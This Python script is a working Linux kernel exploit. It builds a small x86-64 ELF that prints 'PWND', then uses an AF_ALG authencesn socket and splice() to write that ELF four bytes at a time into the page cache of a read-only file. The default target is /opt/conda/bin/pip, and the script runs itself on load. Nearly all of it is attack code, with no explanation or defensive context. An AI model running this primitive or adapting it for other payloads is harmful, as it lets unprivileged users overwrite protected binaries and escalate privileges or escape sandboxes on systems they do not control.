import os
import socket


SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_AEAD_AUTHSIZE = 5
ALG_SET_OP = 3
ALG_SET_IV = 2
ALG_SET_AEAD_ASSOCLEN = 4
AF_ALG = 38


def build_print_payload(message="PWND"):
    encoded = message.encode() + b"\n"
    shellcode = bytes.fromhex(
        "b801000000"          # mov eax, SYS_write
        "bf01000000"          # mov edi, STDOUT_FILENO
        "488d35"              # lea rsi, [rip+0x10]
    ) + (0x10).to_bytes(4, "little") + bytes.fromhex(
        "ba"                  # mov edx, len(message)
    ) + len(encoded).to_bytes(4, "little") + bytes.fromhex(
        "0f05"                # syscall
        "31ff"                # xor edi, edi
        "b83c000000"          # mov eax, SYS_exit
        "0f05"                # syscall
    ) + encoded

    entry_offset = 0x78
    size = entry_offset + len(shellcode)
    if size % 4:
        size += 4 - (size % 4)

    elf = bytearray(size)
    elf[0:16] = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
    elf[16:18] = (2).to_bytes(2, "little")       # ET_EXEC
    elf[18:20] = (0x3E).to_bytes(2, "little")    # x86-64
    elf[20:24] = (1).to_bytes(4, "little")
    elf[24:32] = (0x400000 + entry_offset).to_bytes(8, "little")
    elf[32:40] = (0x40).to_bytes(8, "little")    # e_phoff
    elf[52:54] = (0x40).to_bytes(2, "little")    # e_ehsize
    elf[54:56] = (0x38).to_bytes(2, "little")    # e_phentsize
    elf[56:58] = (1).to_bytes(2, "little")       # e_phnum

    ph = 0x40
    elf[ph:ph + 4] = (1).to_bytes(4, "little")       # PT_LOAD
    elf[ph + 4:ph + 8] = (5).to_bytes(4, "little")   # PF_R|PF_X
    elf[ph + 16:ph + 24] = (0x400000).to_bytes(8, "little")
    elf[ph + 24:ph + 32] = (0x400000).to_bytes(8, "little")
    elf[ph + 32:ph + 40] = (size).to_bytes(8, "little")
    elf[ph + 40:ph + 48] = (size).to_bytes(8, "little")
    elf[ph + 48:ph + 56] = (0x1000).to_bytes(8, "little")
    elf[entry_offset:entry_offset + len(shellcode)] = shellcode
    return bytes(elf)


def poison_4_bytes(fd, offset, chunk):
    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    alg.setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010" + "0" * 64))
    alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)

    op, _ = alg.accept()
    zero = b"\x00"
    copy_len = offset + 4
    op.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, ALG_SET_OP, zero * 4),
            (SOL_ALG, ALG_SET_IV, b"\x10" + zero * 19),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + zero * 3),
        ],
        32768,
    )

    rfd, wfd = os.pipe()
    try:
        os.splice(fd, wfd, copy_len, offset_src=0)
        os.splice(rfd, op.fileno(), copy_len)
        try:
            op.recv(8 + offset)
        except OSError:
            pass
    finally:
        os.close(rfd)
        os.close(wfd)
        op.close()
        alg.close()


def poison_path(target, payload):
    fd = os.open(target, os.O_RDONLY)
    try:
        for offset in range(0, len(payload), 4):
            poison_4_bytes(fd, offset, payload[offset:offset + 4])
    finally:
        os.close(fd)


def run(target="/opt/conda/bin/pip", text="PWND"):
    payload = build_print_payload(text)
    print(f"[+] target: {target}")
    print(f"[+] in-memory print payload: {text!r}")
    print(f"[+] payload length: {len(payload)} bytes")
    poison_path(target, payload)
    print(f"[+] wrote {len(payload)} bytes through AF_ALG/splice page-cache primitive")
    print("[+] done")


run()
